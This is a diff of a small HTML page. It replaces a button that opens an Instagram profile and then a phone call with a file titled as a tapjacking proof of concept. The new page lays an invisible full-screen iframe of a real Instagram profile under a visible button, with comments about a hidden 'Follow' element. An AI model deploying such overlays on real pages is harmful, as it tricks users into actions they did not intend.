@@ -1,26 +1,33 @@
-<!doctype html>
-<button id="b">Call and Share</button>
-
-<script>
-document.getElementById('b').onclick = async () => {
-  // First, navigate to Instagram
-  setTimeout(() => {
-    location.href = 'https://www.instagram.com/unthrz?igsh=czZmbmhpY2o3eXho';
-  }, 654); // Short delay before navigating to Instagram
-
-  // Then trigger a phone call (using the "tel:" protocol)
-  setTimeout(() => {
-    location.href = 'tel:+1234567890';  // Replace with the desired phone number
-  }, 4000); // Slight delay to allow Instagram to load before calling
-
-  // You can also add share functionality, though Instagram doesn’t support the Web Share API:
-  if (navigator.share) {
-    await navigator.share({
-      title: 'Test',
-      url: 'https://instagram.com'
-    });
-  }
-};
-</script>
-
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tapjacking PoC Example</title>
+  <style>
+    /* Making the iframe invisible */
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;  /* Making the iframe invisible */
+      pointer-events: none;  /* Preventing interactions with the iframe itself */
+    }
+    button {
+      position: relative;
+      z-index: 1;  /* Ensure button is on top */
+    }
+  </style>
+</head>
+<body>
+  <h2>Tapjacking Example</h2>
+  
+  <!-- Real visible button -->
+  <button onclick="alert('Button clicked!')">Click Me!</button>
+  
+  <!-- Invisible iframe (mimicking a hidden "Follow" button or other element) -->
+  <iframe src="https://www.instagram.com/unthrz" ></iframe>
+</body>
+</html>
